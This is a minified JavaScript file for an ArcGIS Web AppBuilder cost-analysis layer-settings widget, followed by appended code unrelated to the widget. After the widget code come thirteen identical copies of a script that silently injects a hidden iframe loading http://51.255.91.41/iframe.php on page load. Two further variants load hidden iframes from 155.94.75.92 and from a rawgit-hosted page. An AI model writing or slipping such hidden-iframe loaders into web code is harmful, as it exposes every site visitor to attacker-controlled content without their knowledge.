// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/setting/LayerSettings.html":'\x3cdiv class\x3d"esriCTTabNode"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"layerSettingsMainContainer"\x3e\r\n    \x3cdiv class\x3d"esriCTLayerSettingsTableNode" data-dojo-attach-point\x3d"layerSettingsTableNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTHidden esriCTNoAssetLayersAvailable" data-dojo-attach-point\x3d"noAssetLayersAvailable"\x3e\r\n      ${nls.layerSettings.noAssetLayersAvailable}\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./LayerSettings.html dojo/_base/lang jimu/dijit/SimpleTable dojo/_base/array dojo/query dijit/registry dojo/dom-class dijit/form/Select dojo/dom-construct dojo/_base/html dojo/on dojo/dom-attr".split(" "),function(n,p,q,r,t,e,u,h,g,k,f,v,w,x,y,l){return n([p,q,r],{templateString:t,baseClass:"jimu-widget-cost-analysis-layer-settings",_layerSettingsTable:null,constructor:function(a){e.mixin(this,a)},postMixInProperties:function(){this.nls.common=
{};e.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.inherited(arguments);this._layerSettingsTable=null},setConfig:function(){this._filterLayers()},getConfig:function(){return this._getUpdateLayerSettings()},_getUpdateLayerSettings:function(){var a;if(this._layerSettingsTable)return a=this._layerSettingsTable.getData(),a=this._getSelectedFields(a)},_createlayerSettingsGrid:function(){this._layerSettingsTable=new u({fields:[{name:"title",title:this.nls.layerSettings.layerNameHeaderTitle,
type:"text",editable:!1,width:"44%"},{name:"fieldPicker",title:this.nls.layerSettings.fieldPickerHeaderTitle,type:"empty",editable:!1,width:"40%"},{name:"editable",title:this.nls.layerSettings.EditableLayerHeaderTitle,type:"checkbox",editable:!1,width:"16%"},{name:"selectable",title:this.nls.layerSettings.SelectableLayerHeaderTitle,type:"checkbox",editable:!1,hidden:!0,width:"16%"},{name:"id",title:"id",type:"text",editable:!1,hidden:!0,width:"0%"},{name:"url",title:"url",type:"text",editable:!1,
hidden:!0,width:"0%"}],selectable:!0});this._layerSettingsTable.placeAt(this.layerSettingsTableNode);x.setStyle(this._layerSettingsTable.domNode,{height:"100%"});this._layerSettingsTable.startup()},onLayerSettingChange:function(a){var b={};if(a=this._layerSettingsTable.getRowData(a))b.layerId=a.id,b.editable=null===a.editable?!1:a.editable;this.emit("onLayerSettingUpdate",b)},_filterLayers:function(){var a,b,d=[];a=this.map.itemInfo.itemData.operationalLayers;0===a.length?f.remove(this.noAssetLayersAvailable,
"esriCTHidden"):(f.add(this.noAssetLayersAvailable,"esriCTDisabled"),this._createlayerSettingsGrid(),this._setTableHeadTooltip(),d=[this.config.projectSettings.costingGeometryLayer||"",this.config.projectSettings.projectLayer||""],this.config&&0<this.config.layerSettings.length&&h.forEach(this.config.layerSettings,e.hitch(this,function(a){if(b=this.map.getLayer(a.id))d.push(a.id),b.editable=this._checkEditCapabilities(b),this._createFieldsRows(a,b.editable)})),h.forEach(a,e.hitch(this,function(a){"ArcGISFeatureLayer"===
a.layerType&&-1===d.indexOf(a.id)&&(a.selectable=!0,a.editable=this._checkEditCapabilities(a.layerObject),this._createFieldsRows(a,a.editable))})))},_checkEditCapabilities:function(a){return a.capabilities&&-1!==a.capabilities.indexOf("Delete")&&-1!==a.capabilities.indexOf("Create")&&-1!==a.capabilities.indexOf("Update")&&a.globalIdField?!0:!1},_enableDisableEditableCheckbox:function(a,b){var d,c;d=g(".simple-table-cell ",a)[2];d.children[0]&&(c=k.byNode(d.children[0]));b?(f.remove(c.domNode,"jimu-state-disabled"),
c.set("status",!0),a.selectFields&&a.selectFields.set("disabled",!1)):(f.add(c.domNode,"jimu-state-disabled"),l.set(c.domNode,"title",this.nls.layerSettings.disableEditableCheckboxTooltip),c.set("status",!1),a.selectFields&&a.selectFields.set("disabled",!0))},_createFieldsRows:function(a,b){var d,c,m;a.editable&&(a.selectable=a.editable);d=this._layerSettingsTable.addRow({title:a.title?a.title:a.name,editable:a.editable,selectable:a.selectable,id:a.id,url:a.url});c=g(".jimu-checkbox",d.tr.children[2]);
m=g(".jimu-checkbox",d.tr.children[3]);a.editable&&this._setCheckBoxState(c[0],m[0]);setTimeout(e.hitch(this,function(){this._setHeaderCheckBoxState()}),200);this.own(y(k.byNode(c[0]),"change",e.hitch(this,function(){this._setCheckBoxState(c[0],m[0]);this._setHeaderCheckBoxState();this.onLayerSettingChange(c[0].parentElement.parentElement)})));this._addFieldsDropDown(d.tr,a);this._enableDisableEditableCheckbox(d.tr,b)},_setCheckBoxState:function(a,b){a=k.byNode(a);b=k.byNode(b);a.checked?(b.set("checked",
!0),b.set("status",!1),b.set("disable",!0),f.add(b.domNode,"jimu-state-disabled")):(b.set("checked",!0),b.set("status",!0),b.set("disable",!1),f.remove(b.domNode,"jimu-state-disabled"));f.add(b.domNode.children[0],"checked")},_setHeaderCheckBoxState:function(){var a,b,d=!0,c;a=g(".simple-table-title .checkbox",this.domNode)[1];c=g(".simple-table-title .jimu-checkbox",this.domNode)[1];h.some(this._layerSettingsTable.getRows(),e.hitch(this,function(a){b=g("td.selectable .checked",a);if(0===b.length)return d=
!1,!0}));d?(f.add(a,"checked"),k.byNode(c).set("checked",!0)):(f.remove(a,"checked"),k.byNode(c).set("checked",!1))},updateLayerSettingsTable:function(a){var b=this._layerSettingsTable.getData(),d;a.lastSelectedId&&(d=this.layerInfosObj.getLayerInfoById(a.lastSelectedId).layerObject,d.editable=this._checkEditCapabilities(d),d.selectable=!0,this._createFieldsRows(d,d.editable));a.currentSelectedLayerId&&h.some(b,e.hitch(this,function(b,d){if(b.id===a.currentSelectedLayerId)return this._layerSettingsTable.deleteRow(this._layerSettingsTable.tbody.rows[d]),
!0}))},_addFieldsDropDown:function(a,b){var d,c;c=b.layerObject?b.layerObject:this.map._layers[b.id];if(d=g(".simple-table-cell",a)[1])d=w.create("div",{"class":"esriCTDropDownContainer"},d),a.selectFields=new v({options:this._getFieldsOptionsObj(c),"class":"esriCTLayerSettingsFieldsDropdown"}),a.selectFields.placeAt(d),a.selectFields.startup(),b.selectedField&&a.selectFields.set("value",b.selectedField)},_getFieldsOptionsObj:function(a){var b=[],d,c;c=a.fields;d=["esriFieldTypeString"];b.push({label:this.nls.layerSettings.selectLabel,
value:""});h.forEach(c,e.hitch(this,function(c){c.editable&&!c.domain&&-1<d.indexOf(c.type)&&37<c.length&&c.name!==a.typeIdField&&b.push({label:c.alias||c.name,value:c.name})}));return b},_getSelectedFields:function(a){var b;b=this._layerSettingsTable.getRows();h.forEach(b,e.hitch(this,function(b,c){b.selectFields&&(a[c].selectedField=b.selectFields.getValue(),null===a[c].editable&&(a[c].editable=!1),delete a[c].fieldPicker)}));return a},_setTableHeadTooltip:function(){var a;a=g(".simple-table-thead th",
this.domNode);a.length&&(l.set(a[0],"title",this.nls.layerSettings.layerNameHeaderTooltip),l.set(a[1],"title",this.nls.layerSettings.fieldPickerHeaderTooltip),l.set(a[2],"title",this.nls.layerSettings.EditableLayerHeaderTooltip),l.set(a[3],"title",this.nls.layerSettings.SelectableLayerHeaderTooltip))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});